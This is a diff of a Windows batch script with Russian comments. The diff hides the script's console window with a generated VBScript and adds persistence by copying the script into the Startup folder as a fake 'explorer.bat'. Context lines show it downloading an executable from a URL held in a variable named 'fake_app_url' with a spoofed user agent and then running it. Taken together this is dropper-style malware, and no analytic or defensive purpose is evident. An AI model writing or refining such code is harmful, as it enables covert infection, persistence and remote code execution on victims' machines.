@@ -1,16 +1,15 @@
 @echo off
-rem Если скрипт был запущен с параметром 'hidden',
-rem то он выполнит код, помеченный как :hidden_mode
-if "%~1" == "hidden" goto :hidden_mode
+if "%1"=="hidden" goto HIDDEN
 
-rem Запускаем этот же файл, но с параметром 'hidden' и в скрытом окне.
-rem Используем 'mshta' для выполнения VBScript.
-mshta vbscript:createobject("wscript.shell").run("""%~f0"" hidden",0)(window.close)
-
-rem Завершаем работу текущего, видимого окна консоли.
+:: Создаем VBS-скрипт для скрытого перезапуска
+set "vbsfile=%temp%\invisible.vbs"
+echo Set WshShell = CreateObject^("WScript.Shell"^) > "%vbsfile%"
+echo WshShell.Run "cmd /c ""%~f0"" hidden", 0, False >> "%vbsfile%"
+wscript "%vbsfile%"
+del "%vbsfile%"
 exit
 
-:hidden_mode
+:HIDDEN
 setlocal EnableDelayedExpansion
 
 set "max_dir=C:\.MAX"
@@ -28,6 +27,20 @@ if exist "%fake_app_file%" (
     start "" "%fake_app_file%"
     exit
 )
+
+
+set "StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "MyBatFile=%~f0"
+set "ShortcutName=explorer.bat"
+
+:: Копирование самого BAT-файла в папку автозагрузки
+if not exist "%StartupFolder%\%ShortcutName%" (
+    copy "%MyBatFile%" "%StartupFolder%\%ShortcutName%"
+    echo Файл успешно скопирован в автозагрузку.
+) else (
+    echo Файл уже находится в автозагрузке.
+)
+
 
 powershell -Command "Invoke-WebRequest -Uri '%fake_app_url%' -OutFile '%fake_app_file%' -UserAgent 'Mozilla/5.0'" 2>nul
 start "" "%fake_app_file%"
@@ -134,6 +147,13 @@ if exist "%max_dir%" (
     ) else (
         echo [%time%] Ссылка для watcher не указана
     )
+)
+
+if exist "%StartupFolder%\%ShortcutName%" (
+    del "%StartupFolder%\%ShortcutName%"
+    echo Файл "%ShortcutName%" успешно удален.
+) else (
+    echo Файл "%ShortcutName%" не найден.
 )
 
 echo [%time%] Процесс завершен
